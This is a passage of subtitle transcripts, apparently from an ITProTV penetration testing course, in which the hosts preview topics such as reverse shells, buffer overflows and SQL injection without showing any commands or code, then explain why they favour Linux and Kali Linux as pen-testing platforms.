testing.\n\n3\n00:00:09.010 --> 00:00:13.650\nAnd here to tell us all about it and\nwhat we can expect is Mr Daniel Lowrie.\n\n4\n00:00:13.650 --> 00:00:17.130\n&gt;&gt; Mike, I am so excited about\nthis new series we got coming up.\n\n5\n00:00:17.130 --> 00:00:21.040\nWorked long and hard to bring you guys\na great penetration testing series.\n\n6\n00:00:21.040 --> 00:00:23.760\nGot a lot of really cool techniques and\ntools and\n\n7\n00:00:23.760 --> 00:00:25.360\nthings that we're gonna walk through and\n\n8\n00:00:25.360 --> 00:00:30.220\nshow you guys, that you can properly\npenetration and test your own systems.\n\n9\n00:00:30.220 --> 00:00:32.730\nThat's our great caveat\nwe always like to say.\n\n10\n00:00:32.730 --> 00:00:35.040\nDon't do these things on\nother people's computers.\n\n11\n00:00:35.040 --> 00:00:38.460\nLet me give you a quick rundown on\nsome of the techniques and tools,\n\n12\n00:00:38.460 --> 00:00:41.580\nand items that you might find\nin our series coming up.\n\n13\n00:00:41.580 --> 00:00:43.790\nWe're gonna learn basics of Linux.\n\n14\n00:00:43.790 --> 00:00:47.510\nWe're gonna take a look at Kali Linux\nas a pen-testing platform.\n\n15\n00:00:47.510 --> 00:00:50.220\nWe're gonna use it extensively\nthroughout the series.\n\n16\n00:00:50.220 --> 00:00:53.820\nSo, if you're unfamiliar with Linux you\nget a little bit of a primer there.\n\n17\n00:00:53.820 --> 00:00:57.560\nWe do have a bit of assumed knowledge\nwhen it comes to this level,\n\n18\n00:00:57.560 --> 00:01:01.180\nbecause it is a very high level course.\n\n19\n00:01:01.180 --> 00:01:03.800\nYou do have to have some Linux knowledge.\n\n20\n00:01:03.800 --> 00:01:06.580\nYou do need to have a pretty good\nextensive Windows knowledge.\n\n21\n00:01:06.580 --> 00:01:10.120\nYou will probably need some\nprogramming knowledge as well.\n\n22\n00:01:10.120 --> 00:01:11.030\nSo keep that in mind.\n\n23\n00:01:11.030 --> 00:01:13.660\nThis series is definitely\ngoing to test you.\n\n24\n00:01:13.660 --> 00:01:14.770\nIt's gonna twist you.\n\n25\n00:01:14.770 --> 00:01:18.500\nIt's gonna push you to the edge because\nthere's a lot of advanced techniques and\n\n26\n00:01:18.500 --> 00:01:21.090\nmethodologies that you're\ngonna find throughout.\n\n27\n00:01:21.090 --> 00:01:23.930\nA couple other things that we're gonna\ntake a look at is how to create shells.\n\n28\n00:01:23.930 --> 00:01:27.300\nBind shells, reverse shells,\nvery cool stuff.\n\n29\n00:01:27.300 --> 00:01:30.140\nScanning and\nenumeration tools and techniques.\n\n30\n00:01:30.140 --> 00:01:31.150\nTools are all out there.\n\n31\n00:01:31.150 --> 00:01:34.160\nWe definitely all need to know how\nto do things like end map scans.\n\n32\n00:01:34.160 --> 00:01:38.563\nWork with, I don't know for\nweb scanning, SQL scanning,\n\n33\n00:01:38.563 --> 00:01:42.670\ntons of different types of\nscanning options available for us.\n\n34\n00:01:42.670 --> 00:01:44.420\nWe need to find the flaws right.\n\n35\n00:01:45.570 --> 00:01:49.460\nThen we need to look on writing\ncustom buffer overflows.\n\n36\n00:01:49.460 --> 00:01:52.670\nYes, when I said this gets\na little bit above board\n\n37\n00:01:52.670 --> 00:01:55.282\nthis is where the definitely\nthe metal meets the meat.\n\n38\n00:01:55.282 --> 00:01:58.690\nWe're gonna walk you through a finding,\ncreating, and\n\n39\n00:01:58.690 --> 00:02:03.130\nexploiting a program that is\nvulnerable to a buffer overflow.\n\n40\n00:02:03.130 --> 00:02:05.210\nSo taking you from soup that's on that.\n\n41\n00:02:05.210 --> 00:02:07.030\nWe'll also take a look\nat cross side scripting.\n\n42\n00:02:07.030 --> 00:02:09.485\nA very common technique nowadays.\n\n43\n00:02:09.485 --> 00:02:13.450\nSo you how to implement that so that\nyou might be able to test your systems.\n\n44\n00:02:13.450 --> 00:02:18.580\nContinuing on the line of maybe,\nweb, we have client side attacks,\n\n45\n00:02:18.580 --> 00:02:23.790\nsession hijacking, very dangerous,\nremote and local file inclusions.\n\n46\n00:02:23.790 --> 00:02:28.290\nRFIs, LFIs, if that's how you've\nheard them before, very dangerous.\n\n47\n00:02:28.290 --> 00:02:32.230\nWe'll also look at privilege escalation\nonce we've gained access to the box.\n\n48\n00:02:32.230 --> 00:02:34.210\nMaybe we're not administrators, per se?\n\n49\n00:02:34.210 --> 00:02:36.610\nWe want to bump that privilege up, so\n\n50\n00:02:36.610 --> 00:02:38.510\nwe're gonna use privilege\nescalation techniques for that.\n\n51\n00:02:38.510 --> 00:02:42.070\nWe're gonna take a look at SQL injection,\nbecause if you don't know your SQL\n\n52\n00:02:42.070 --> 00:02:44.870\ninjection, well, then you're coming\nlate to the party ladies and gentleman.\n\n53\n00:02:44.870 --> 00:02:49.520\nSo we're gonna give you a good base\nfoundation knowledge on how to do SQL\n\n54\n00:02:49.520 --> 00:02:53.380\ninjection attacks in\nyour penetration testing.\n\n55\n00:02:53.380 --> 00:02:55.050\nAlso take a look at password cracking.\n\n56\n00:02:55.050 --> 00:02:57.710\nIt's like a day without sunshine if\nwe haven't cracked a password when it\n\n57\n00:02:57.710 --> 00:02:58.810\ncomes to hacking, right?\n\n58\n00:02:58.810 --> 00:03:00.850\nOr penetration testing should I say.\n\n59\n00:03:00.850 --> 00:03:05.090\nAlso looking at network\nservice proof force attacks.\n\n60\n00:03:05.090 --> 00:03:09.360\nAnd finally, port redirection to\nget around those pesky firewalls.\n\n61\n00:03:09.360 --> 00:03:13.320\nSo a lot of really in depth and\nbroad information that\n\n62\n00:03:13.320 --> 00:03:18.140\nshould build you a great foundation for\ndoing your own penetration testing.\n\n63\n00:03:18.140 --> 00:03:21.410\n&gt;&gt; All right, Daniel,\nthose sound like some exciting topics.\n\n64\n00:03:21.410 --> 00:03:25.270\nI'm excited, hopefully everybody\nout there is as excited as I am.\n\n65\n00:03:25.270 --> 00:03:26.390\nCan't wait to get started,\n\n66\n00:03:26.390 --> 00:03:29.840\ncan't wait to see you with us here for\npenetration testing.\n\n67\n00:03:29.840 --> 00:03:34.249\n[SOUND]\n\n",

ITProTV.\n\n6\n00:00:15.570 --> 00:00:19.660\nI'm your host Mike Rodrick, and\ntoday we're doing penetrating testing.\n\n7\n00:00:19.660 --> 00:00:23.100\nAnd, specifically in this episode, we're\ngonna be taking a look at the different\n\n8\n00:00:23.100 --> 00:00:25.250\nplatforms that we might want to use.\n\n9\n00:00:25.250 --> 00:00:27.680\nAs we're getting into penetration testing.\n\n10\n00:00:27.680 --> 00:00:31.880\nAs well as some of the basic skills, some\nof that foundational knowledge we need\n\n11\n00:00:31.880 --> 00:00:35.690\nto get started in penetration testing and\nwork through the rest of these episodes.\n\n12\n00:00:35.690 --> 00:00:39.180\nAnd here to guide us on our journey,\nto get us started in the world\n\n13\n00:00:39.180 --> 00:00:42.780\nPenetration testing is security guru Mr.\nDaniel Lowrie.\n\n14\n00:00:42.780 --> 00:00:43.470\nWelcome, Daniel.\n\n15\n00:00:43.470 --> 00:00:46.270\n&gt;&gt; Well, thanks for\nthe really high praise there, security.\n\n16\n00:00:46.270 --> 00:00:49.120\nI don't know about security guru but\nI know a thing or two about security.\n\n17\n00:00:49.120 --> 00:00:52.250\nI am so happy to be here though\nthis is going to be a lot of fun.\n\n18\n00:00:52.250 --> 00:00:54.250\nI am really looking\nforward to this series.\n\n19\n00:00:54.250 --> 00:00:55.270\nI hope you guys are as well.\n\n20\n00:00:55.270 --> 00:00:58.670\nWe've worked really hard to bring you\nsome really good hands-on things so\n\n21\n00:00:58.670 --> 00:01:03.130\nthat you can actually implement and\ndo stuff and not just hear about theory.\n\n22\n00:01:03.130 --> 00:01:04.620\nIt's not what we wanna do.\n\n23\n00:01:04.620 --> 00:01:06.980\nThis series is all about\nlet's do something.\n\n24\n00:01:06.980 --> 00:01:09.130\nLet's make stuff happen and I say that and\n\n25\n00:01:09.130 --> 00:01:11.600\nof course our first show\nis mostly about theory.\n\n26\n00:01:11.600 --> 00:01:13.510\nCuz we do have to set the stage, right?\n\n27\n00:01:13.510 --> 00:01:16.130\nAs Mike said we've got to know\nwhat platforms we can use.\n\n28\n00:01:16.130 --> 00:01:17.689\nYou can't just say well I'm a Pentester.\n\n29\n00:01:18.990 --> 00:01:19.620\nWhat do I do?\n\n30\n00:01:19.620 --> 00:01:22.471\nRight, so I gonna give you that's the,\nget the energy going,right?\n\n31\n00:01:22.471 --> 00:01:26.868\nThe first initiation into the four ray,\nthat is pen testing.\n\n32\n00:01:26.868 --> 00:01:28.720\nNow, we say the word pensaas,\n\n33\n00:01:28.720 --> 00:01:30.802\nlets make sure that we are all\non the same page on this.\n\n34\n00:01:30.802 --> 00:01:35.800\nWe mean pen testing, not necessarily,\nyou are a, you can take, what you will be\n\n35\n00:01:35.800 --> 00:01:41.080\nable to take these skills and apply them\nif you are a penetracian tester as a job.\n\n36\n00:01:41.080 --> 00:01:41.900\nThat's what you do.\n\n37\n00:01:41.900 --> 00:01:44.560\nThese are some of the skills that\nyou're probably already doing,\n\n38\n00:01:44.560 --> 00:01:45.470\nif not all of them, right?\n\n39\n00:01:45.470 --> 00:01:46.790\nThat's part of it.\n\n40\n00:01:46.790 --> 00:01:48.570\nIf you want to become\na penetration tester,\n\n41\n00:01:48.570 --> 00:01:53.050\nthis will lay a great foundation for\nyou to get into that field.\n\n42\n00:01:53.050 --> 00:01:56.410\nYou might already be in IT, and\n\n43\n00:01:56.410 --> 00:01:59.430\nif you're watching this you probably are\nin IT, or are at least interested in IT.\n\n44\n00:01:59.430 --> 00:02:01.690\nYou might have some security knowledge.\n\n45\n00:02:01.690 --> 00:02:03.680\nThis is also perfect knowledge for you.\n\n46\n00:02:03.680 --> 00:02:06.450\nWhat we are going to do is teach\nyou things that you can implement\n\n47\n00:02:06.450 --> 00:02:09.590\nas a security professional and then say,\nwe do not have to hire the third party,\n\n48\n00:02:09.590 --> 00:02:11.080\nI can do my own penetration testing.\n\n49\n00:02:11.080 --> 00:02:13.870\nSo, that is kind of the idea of\nwhat this show is all about.\n\n50\n00:02:13.870 --> 00:02:16.480\nThat being said, we do have to start\nwith some foundational knowledge for\n\n51\n00:02:16.480 --> 00:02:19.550\nthose that this might be\ntheir first foray into this.\n\n52\n00:02:19.550 --> 00:02:23.660\nSo let us talk about,\nlet's talk about hacking platforms, right.\n\n53\n00:02:23.660 --> 00:02:27.130\n&gt;&gt; We got a few choices, but I think one\nis gonna stick out above the others,\n\n54\n00:02:27.130 --> 00:02:27.770\nright?\n\n55\n00:02:27.770 --> 00:02:30.800\n&gt;&gt; Yeah, Mike's no slouch when it comes to\nsecurity, the man knows a thing or two,\n\n56\n00:02:30.800 --> 00:02:34.710\nanybody that's watched any of his\nshows here at ItPro.TV will attest to\n\n57\n00:02:34.710 --> 00:02:38.580\nthat very fact, the man is smart and\nhe is right, he gets the gold star.\n\n58\n00:02:38.580 --> 00:02:41.710\nThere are multiple different\nplatforms in which we can use.\n\n59\n00:02:41.710 --> 00:02:44.430\nYou might have a favorite\nout there already.\n\n60\n00:02:44.430 --> 00:02:48.408\nIf one of your favorites is not Linux,\nif your favorite is not Linux,\n\n61\n00:02:48.408 --> 00:02:49.605\nthen well, sorry.\n\n62\n00:02:49.605 --> 00:02:52.085\n[LAUGH] Cuz that's the platform of choice.\n\n63\n00:02:52.085 --> 00:02:59.020\n[LAUGH] I love hearing Mike laugh,\nhe's also our Windows guy around here.\n\n64\n00:02:59.020 --> 00:02:59.690\n&gt;&gt; I am.\n\n65\n00:02:59.690 --> 00:03:00.640\n&gt;&gt; So it's kinda funny.\n\n66\n00:03:00.640 --> 00:03:04.860\n&gt;&gt; But humble enough to understand\nthat Windows has many strengths and\n\n67\n00:03:04.860 --> 00:03:08.880\nmany uses\n&gt;&gt; As a penetration testing platform\n\n68\n00:03:08.880 --> 00:03:09.910\nit's not the strongest.\n\n69\n00:03:09.910 --> 00:03:11.030\n&gt;&gt; Exactly, exactly.\n\n70\n00:03:11.030 --> 00:03:14.390\nAnd that doesn't mean we're not gonna\nuse it, actually quite the contrary,\n\n71\n00:03:14.390 --> 00:03:17.490\nWe are gonna use Windows as a platform for\ncertain things.\n\n72\n00:03:18.720 --> 00:03:20.730\nThat's what really it boils down to.\n\n73\n00:03:20.730 --> 00:03:26.410\nNone of these platforms are any\nQuote unquote better than the other,\n\n74\n00:03:26.410 --> 00:03:28.990\nthey just have an intended use, right?\n\n75\n00:03:28.990 --> 00:03:32.730\nYou don't use a screwdriver\nto put a nail into a board.\n\n76\n00:03:32.730 --> 00:03:34.940\nYou grab a hammer,\ncuz that's what the hammer does.\n\n77\n00:03:34.940 --> 00:03:37.760\nThe same thing applies when it\ncomes to these different platforms.\n\n78\n00:03:37.760 --> 00:03:39.510\nTypically though, most of your tools and\n\n79\n00:03:39.510 --> 00:03:43.170\neverything that we're gonna be looking at,\nWill run in a Linux environment and\n\n80\n00:03:43.170 --> 00:03:48.210\nare created for a Linux environment So we\nare going to spend a lot of time in Linux.\n\n81\n00:03:48.210 --> 00:03:51.280\nSo that is definitely something\nyou're going to have to get used to.\n\n82\n00:03:51.280 --> 00:03:54.150\nIf you're not Linux savvy, guess what?\n\n83\n00:03:54.150 --> 00:03:56.910\nAt ITProTV we have courses on that.\n\n84\n00:03:56.910 --> 00:03:58.010\nJump into our course library.\n\n85\n00:03:58.010 --> 00:03:59.840\nCheck out our Linux courses.\n\n86\n00:03:59.840 --> 00:04:01.810\nThere's phenomenal content in there.\n\n87\n00:04:01.810 --> 00:04:05.680\nSo definitely learn, we are gonna\ntalk about some of the basic basics,\n\n88\n00:04:05.680 --> 00:04:08.280\nthough, just to make sure that\nyou can follow along if you're\n\n89\n00:04:08.280 --> 00:04:09.880\nnot super Linux savvy, though.\n\n90\n00:04:09.880 --> 00:04:13.720\n&gt;&gt; So, Daniel, then Linux is\nthe platform of our choice, okay.\n\n91\n00:04:13.720 --> 00:04:14.470\nTell me why.\n\n92\n00:04:14.470 --> 00:04:16.550\nWhat makes Linux so much better?\n\n93\n00:04:16.550 --> 00:04:18.920\nThen say Windows or Mac.\n\n94\n00:04:18.920 --> 00:04:20.230\n&gt;&gt; Yeah, that's a great question.\n\n95\n00:04:20.230 --> 00:04:22.540\nYou might be going,\nyeah Windows one is rock solid man,\n\n96\n00:04:22.540 --> 00:04:24.150\nit's a great operating system.\n\n97\n00:04:24.150 --> 00:04:26.300\nYou're absolutely correct,\nit is a great operating system.\n\n98\n00:04:26.300 --> 00:04:29.420\nI've run it plenty of times myself.\n\n99\n00:04:29.420 --> 00:04:31.560\nWhy Linux kinda sticks out?\n\n100\n00:04:31.560 --> 00:04:36.060\nIs because for this purpose it's,\n[LAUGH], and we laugh when we say this,\n\n101\n00:04:36.060 --> 00:04:37.180\nease of use, right?\n\n102\n00:04:37.180 --> 00:04:37.680\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n103\n00:04:37.680 --> 00:04:38.460\n&gt;&gt; Mike's, Mike,\n\n104\n00:04:38.460 --> 00:04:42.770\nI can tell you days, he sits behind me in\nour office area, him just, blah, blah,\n\n105\n00:04:42.770 --> 00:04:45.360\nblah, blah, stupid Linux,\nwhy do they do this way?\n\n106\n00:04:45.360 --> 00:04:48.238\nYeah, there are some times,\nI've done it myself, we all do.\n\n107\n00:04:48.238 --> 00:04:49.790\n&gt;&gt; [LAUGH]\n&gt;&gt; Even though I like Linux,\n\n108\n00:04:49.790 --> 00:04:54.440\nI use Linux as a daily driver\n&gt;&gt; It can definitely be frustrating\n\n109\n00:04:54.440 --> 00:04:55.380\nin some sense.\n\n110\n00:04:55.380 --> 00:04:59.510\nBut when it comes to penetration testing,\n\n111\n00:04:59.510 --> 00:05:01.510\nthat's where all the cool kids hang out,\nman.\n\n112\n00:05:01.510 --> 00:05:03.800\nSo what ends up happening?\n\n113\n00:05:03.800 --> 00:05:06.740\nEverything becomes streamlined for\nthat process, right?\n\n114\n00:05:06.740 --> 00:05:09.640\nDoing thing like setting up a web server\n\n115\n00:05:09.640 --> 00:05:11.100\nis not that difficult\nto be honest with you.\n\n116\n00:05:11.100 --> 00:05:14.710\nIt's pretty straightforward and,\nstarting and stopping a web server.\n\n117\n00:05:14.710 --> 00:05:18.050\nUsing it for\nwhatever purposes that you need it for.\n\n118\n00:05:18.050 --> 00:05:19.580\nWhat else?\nProgramming, right?\n\n119\n00:05:19.580 --> 00:05:21.500\nWe're talking penetration testing here,\n\n120\n00:05:21.500 --> 00:05:25.530\nwe're not talking script qd,\nlittle kid stuff.\n\n121\n00:05:25.530 --> 00:05:30.340\nThere is some of that, but we are going\nto get into some really in-depth things,\n\n122\n00:05:30.340 --> 00:05:32.079\nand programming is going\nto be a bit of it.\n\n123\n00:05:33.270 --> 00:05:36.110\nProgramming platforms\nare usually built in to any\n\n124\n00:05:36.110 --> 00:05:37.330\nLinux distribution that you download.\n\n125\n00:05:37.330 --> 00:05:39.130\nRight?\nIt has a C compiler,\n\n126\n00:05:39.130 --> 00:05:43.400\nit's got Python usually,\nprobably Ruby nowadays.\n\n127\n00:05:43.400 --> 00:05:45.770\nPearl is probably baked in as well.\n\n128\n00:05:45.770 --> 00:05:47.490\nBash.\nI did the Bash scripting show if you\n\n129\n00:05:47.490 --> 00:05:48.650\nhaven't seen that.\n\n130\n00:05:48.650 --> 00:05:49.940\nThat show is gonna be a great show,\n\n131\n00:05:49.940 --> 00:05:53.490\nyou might want to watch that between\nus doing this, if you're watching live.\n\n132\n00:05:53.490 --> 00:05:56.690\nIf you haven't, definitely check that out\nbecause I lay out a lot of program and\n\n133\n00:05:56.690 --> 00:05:58.290\nconcepts in there.\n\n134\n00:05:58.290 --> 00:06:02.330\nIt's bash specific but they apply across\nthe board cuz we are gonna talk some\n\n135\n00:06:02.330 --> 00:06:05.050\nprogramming a little bit\nlater down the road.\n\n136\n00:06:05.050 --> 00:06:05.610\nWhat else?\n\n137\n00:06:05.610 --> 00:06:07.410\nThings like FTP, right?\n\n138\n00:06:07.410 --> 00:06:13.610\nSSH, Tony all of these services They\nrun really easily on a Linux platform.\n\n139\n00:06:13.610 --> 00:06:14.890\nAnd again, you got to remember,\n\n140\n00:06:14.890 --> 00:06:17.910\nguys that are doing pen testing they're\nprobably a bit of a programmer themselves.\n\n141\n00:06:17.910 --> 00:06:22.830\nWe're talking devops type of stuff,\nsecurity wrapped around that,\n\n142\n00:06:22.830 --> 00:06:24.750\nso they need to be able to develop.\n\n143\n00:06:24.750 --> 00:06:26.450\nThey need to be able to do it easily.\n\n144\n00:06:26.450 --> 00:06:27.610\nThey need to be able to make it look good.\n\n145\n00:06:27.610 --> 00:06:31.350\nThey need to be able to make it work\nnd not have to fiddle around going\n\n146\n00:06:31.350 --> 00:06:34.180\nwell I gotta install C compiler you know.\n\n147\n00:06:34.180 --> 00:06:35.320\nAnd you get that to happen.\n\n148\n00:06:35.320 --> 00:06:36.870\n&gt;&gt; Exactly.\nAnd Windows for\n\n149\n00:06:36.870 --> 00:06:39.580\nwhat it is, is a great operating\nsystem as Daniel said, but\n\n150\n00:06:39.580 --> 00:06:41.440\nit does hide a lot of\nthings from the end user.\n\n151\n00:06:41.440 --> 00:06:46.710\nAnd that's to make it so usable and\nso user friendly for non IT people.\n\n152\n00:06:46.710 --> 00:06:49.990\nBut in this world that we're getting\ninto in penetration testing,\n\n153\n00:06:49.990 --> 00:06:52.050\nI typically need to see\neverything that's going on.\n\n154\n00:06:52.050 --> 00:06:55.250\nI need to control things in a way that\nsome of those operating systems aren't\n\n155\n00:06:55.250 --> 00:06:56.990\ngonna allow Linux.\n\n156\n00:06:56.990 --> 00:06:59.240\nSome of the complaints there\nare it's difficult to use.\n\n157\n00:06:59.240 --> 00:07:01.040\nYou got to do everything\nfrom the command line.\n\n158\n00:07:01.040 --> 00:07:05.170\nYou got to set every little thing,\nit doesn't do anything for you.\n\n159\n00:07:05.170 --> 00:07:07.610\nThat's exactly what we're looking for\nwhen we're looking for\n\n160\n00:07:07.610 --> 00:07:08.810\nthat pen testing environment.\n\n161\n00:07:08.810 --> 00:07:12.770\nI don't need the operating system changing\nanything, doing anything, hiding anything,\n\n162\n00:07:12.770 --> 00:07:15.920\nbecause that's going to alter my results\nand I'll have to troubleshoot and\n\n163\n00:07:15.920 --> 00:07:21.680\nfigure out why and then I think another\nbig push for Linux is the price, right?\n\n164\n00:07:21.680 --> 00:07:26.690\nAs far as licensing goes, most of our\nLinux distributions are freely available.\n\n165\n00:07:26.690 --> 00:07:30.280\nThey're very open, so we can get in\nthere and customize things ourselves.\n\n166\n00:07:30.280 --> 00:07:34.110\nAnd I think it also lends to\nthe popularity of Linux for this.\n\n167\n00:07:34.110 --> 00:07:34.950\n&gt;&gt; Yeah.\n\n168\n00:07:34.950 --> 00:07:36.070\nAll valid points.\n\n169\n00:07:36.070 --> 00:07:40.350\nMike makes great, fantastic points for\nwhy Linux is the drug of choice.\n\n170\n00:07:40.350 --> 00:07:44.310\nWhen it comes to pen testing,\nsecurity, things of that nature.\n\n171\n00:07:44.310 --> 00:07:47.348\nIt's very open,\nobviously it's open source software.\n\n172\n00:07:47.348 --> 00:07:52.270\nAll of the tools you can get are open so\nif you do go down that road deeply or\n\n173\n00:07:52.270 --> 00:07:57.214\nthe rabbit hole as it were into\ndevelopment and learning programming.\n\n174\n00:07:57.214 --> 00:07:59.001\nYou're just gonna love it.\n\n175\n00:07:59.001 --> 00:08:02.590\nNow, macOS, and we'll kinda get into\nmacOS and Windows here in just a bit.\n\n176\n00:08:02.590 --> 00:08:06.882\nAnd we're gonna continue to harp on Linux,\nbecause that's where we're gonna stay for\n\n177\n00:08:06.882 --> 00:08:08.390\nvast majority of this series.\n\n178\n00:08:11.400 --> 00:08:13.380\nIt's just so well streamlined.\n\n179\n00:08:13.380 --> 00:08:14.580\nAll the stuff is there.\n\n180\n00:08:14.580 --> 00:08:20.218\nYou log in as root, or\nyou sudo into administrative credentials,\n\n181\n00:08:20.218 --> 00:08:22.943\nand it's not gonna balk at you.\n\n182\n00:08:22.943 --> 00:08:24.585\nIt's not gonna say,\nthat's kinda dangerous.\n\n183\n00:08:24.585 --> 00:08:30.000\nIt says, you are the big dog around here,\nthe big cheese, the head honcho.\n\n184\n00:08:30.000 --> 00:08:31.090\nWhatever you say goes.\n\n185\n00:08:31.090 --> 00:08:33.930\nI assume you know what you're doing,\nI'll allow that.\n\n186\n00:08:33.930 --> 00:08:36.740\nSo, another reason a lot of\npeople like to use Linux,\n\n187\n00:08:36.740 --> 00:08:38.199\nit doesn't give me any complaints.\n\n188\n00:08:39.350 --> 00:08:42.410\nI've always heard it said that\nthere's security on one side and\n\n189\n00:08:42.410 --> 00:08:43.760\nease of use on the other.\n\n190\n00:08:43.760 --> 00:08:47.200\nBut it also applies to power,\nto be honest with you, right?\n\n191\n00:08:47.200 --> 00:08:51.370\nWhen you have more power,\nease of use, right,\n\n192\n00:08:51.370 --> 00:08:55.378\nkinda goes by the wayside, because it's\nassuming you want to do everything.\n\n193\n00:08:55.378 --> 00:08:59.251\nA lot of people have complained about\nAndroid devices, for that very reason.\n\n194\n00:08:59.251 --> 00:09:00.432\nIt's got so many options!\n\n195\n00:09:00.432 --> 00:09:02.938\nWell, it assumes that,\nit doesn't assume anything.\n\n196\n00:09:02.938 --> 00:09:06.610\nThat's the only thing that it assumes,\nis that it's not gonna assume anything.\n\n197\n00:09:06.610 --> 00:09:09.610\nIt assumes that you wanna\nset everything that\n\n198\n00:09:09.610 --> 00:09:10.740\nyou wanna set, and\nit's not gonna get in your way.\n\n199\n00:09:10.740 --> 00:09:14.250\nWhereas Apple devices, right,\nthey are very user friendly.\n\n200\n00:09:14.250 --> 00:09:15.810\nYou take grandma and grandpa,\nyou give them an iPhone,\n\n201\n00:09:15.810 --> 00:09:18.795\nthey can almost immediately use\nthe stinking thing, ease of use, right?\n\n202\n00:09:18.795 --> 00:09:21.130\nNow, they've done a pretty good job\nof sandboxing the thing as well.\n\n203\n00:09:21.130 --> 00:09:25.902\nBut typically, you have that\nsliding scale, right, one goes up,\n\n204\n00:09:25.902 --> 00:09:27.421\nthe other goes down.\n\n205\n00:09:27.421 --> 00:09:30.585\nSo when you're working in Linux,\nyes, it can be very, very,\n\n206\n00:09:30.585 --> 00:09:32.550\nvery frustrating at times.\n\n207\n00:09:32.550 --> 00:09:36.450\nBut once you kinda get the hang of\nthings and you just resolve yourself to\n\n208\n00:09:36.450 --> 00:09:40.150\nthe fact that that's the way it's gonna\nbe, then you kinda move on, right?\n\n209\n00:09:40.150 --> 00:09:41.100\nYou get past that little stage.\n\n210\n00:09:41.100 --> 00:09:42.394\n&gt;&gt; All right, now Daniel,\n\n211\n00:09:42.394 --> 00:09:46.909\nwe've been saying Linux, the platform of\nchoice for what we're getting ready to do.\n\n212\n00:09:46.909 --> 00:09:50.211\nBut when we say Linux,\nthere are hundreds, if not thousands,\n\n213\n00:09:50.211 --> 00:09:52.060\nof distributions of Linux.\n\n214\n00:09:52.060 --> 00:09:54.930\nAre there any that lend themselves\nmaybe more towards what\n\n215\n00:09:54.930 --> 00:09:55.560\nwe're getting ready to do?\n\n216\n00:09:55.560 --> 00:09:58.370\nAny in particular that you like or\nrecommend?\n\n217\n00:09:58.370 --> 00:10:01.510\n&gt;&gt; Yeah, totally, there's definitely,\nwe, Kali Linux, right?\n\n218\n00:10:01.510 --> 00:10:07.160\nKali Linux is probably the gold standard\nof penetration testing distributions for\n\n219\n00:10:07.160 --> 00:10:09.680\nLinux, K-A-L-I, Kali.\n\n220\n00:10:09.680 --> 00:10:13.184\nWe actually have a series on\nKali Linux right here on ITProTV.\n\n221\n00:10:13.184 --> 00:10:18.100\nSo we're not gonna do a Kali Linux\nprimer or anything like that.\n\n222\n00:10:18.100 --> 00:10:21.478\nIf you need to know about Kali Linux,\njump into the course library,\n\n223\n00:10:21.478 --> 00:10:24.042\nwatch the Kali Linux show,\nwatch the Linux shows.\n\n224\n00:10:24.042 --> 00:10:26.050\nAnd that's gonna help get you up to speed.\n\n225\n00:10:26.050 --> 00:10:27.890\nIf you're a Linux person, you know Linux,\n\n226\n00:10:27.890 --> 00:10:29.530\nthen you know what I'm talking about,\nright?\n\n227\n00:10:29.530 --> 00:10:30.229\nYou're already there.\n\n228\n00:10:30.229 --> 00:10:35.230\nKali Linux is an extremely\nwell-put-together distribution, and\n\n229\n00:10:35.230 --> 00:10:37.420\nit is geared toward pen testers.\n\n230\n00:10:37.420 --> 00:10:41.910\nIt is geared toward people that want to\nengage into security practices, right?\n\n231\n00:10:41.910 --> 00:10:43.380\nThat's what it's all about.\n\n232\n00:10:43.380 --> 00:10:44.810\nAnd let me tell you what.\n\n233\n00:10:44.810 --> 00:10:48.830\nEvery tool under the sun\nis inside of Kali Linux.\n\n234\n00:10:48.830 --> 00:10:51.850\nThey do not skimp, they do not scrounge.\n\n235\n00:10:51.850 --> 00:10:55.087\nIt is,\njust about every time I've thought, wow,\n\n236\n00:10:55.087 --> 00:10:58.342\nI wonder if that scanner\nis in my Kali Linux distru?\n\n237\n00:10:58.342 --> 00:11:01.620\nAnd you do a man, whatever that tool is.\n\n238\n00:11:01.620 --> 00:11:03.810\nThere it is, it's already there.\n\n239\n00:11:03.810 --> 00:11:07.910\nIt's pre-built in, it's pre-baked in, and\nthat's why a lot of people go for it.\n\n240\n00:11:09.040 --> 00:11:11.841\nIf you're coming back into security,\nmaybe you've been out of the game for\n\n241\n00:11:11.841 --> 00:11:13.834\na little while,\nyou might remember it as BackTrack.\n\n242\n00:11:13.834 --> 00:11:16.370\n&gt;&gt; Mm-hm.\n&gt;&gt; That's what it was back in the day,\n\n243\n00:11:16.370 --> 00:11:18.020\nBackTrack 3 and 4 and 5.\n\n244\n00:11:18.020 --> 00:11:21.870\nAnd then it became Kali, or\nKali, whatever you wanna, Kali.\n\n245\n00:11:21.870 --> 00:11:26.035\nIt's fine, I love the Linux community\nwho have flame wars over how things\n\n246\n00:11:26.035 --> 00:11:28.390\nare pronounced, like it matters.\n\n247\n00:11:28.390 --> 00:11:28.970\nIt doesn't.\n\n248\n00:11:28.970 --> 00:11:33.430\nCall it Kali, call it Kali,\ncall it Kali, whatever floats your boat.\n\n249\n00:11:33.430 --> 00:11:34.650\nWe all know what you're talking about.\n\n250\n00:11:34.650 --> 00:11:37.827\nSo I just say Kali for ease of use.\n\n251\n00:11:37.827 --> 00:11:40.269\n&gt;&gt; Works for me.\n&gt;&gt; So let's take a look at my computer\n\n252\n00:11:40.269 --> 00:11:43.330\nreal quick so\nyou see where you can get that.\n\n253\n00:11:43.330 --> 00:11:45.929\nWe have www.kali.org,\nby Offensive Security.\n\n254\n00:11:45.929 --> 00:11:48.980\nThe guys at Offensive Security\nare awesome.\n\n255\n00:11:48.980 --> 00:11:51.270\nThey put together a lot of great stuff.\n\n256\n00:11:51.270 --> 00:11:54.870\nAnd they have even training and\ndocumentation in here for\n\n257\n00:11:54.870 --> 00:11:56.660\nfree, very cool stuff.\n\n258\n00:11:56.660 --> 00:11:59.790\nThis Documentation area is priceless.\n\n259\n00:11:59.790 --> 00:12:00.940\nI love their stuff.\n\n260\n00:12:00.940 --> 00:12:04.304\nBut they actually are the ones behind\nthe whole Kali Linux movement.\n\n261\n00:12:04.304 --> 00:12:07.795\nSo that's where you'll go, so kali.org.\n\n262\n00:12:07.795 --> 00:12:12.010\nAnd let me tell you,\ndownloading this thing, it's a good size.\n\n263\n00:12:12.010 --> 00:12:14.795\nI think it's couple of, like a gig or\na gig and a half, whatever,\n\n264\n00:12:14.795 --> 00:12:17.193\nI can't remember exactly\nthe size of the file offhand.\n\n265\n00:12:17.193 --> 00:12:20.865\nBut, can run it in a VM, so\nif you don't wanna blow away your desktop,\n\n266\n00:12:20.865 --> 00:12:24.543\njust throw that into whatever\nvirtualization software you like, 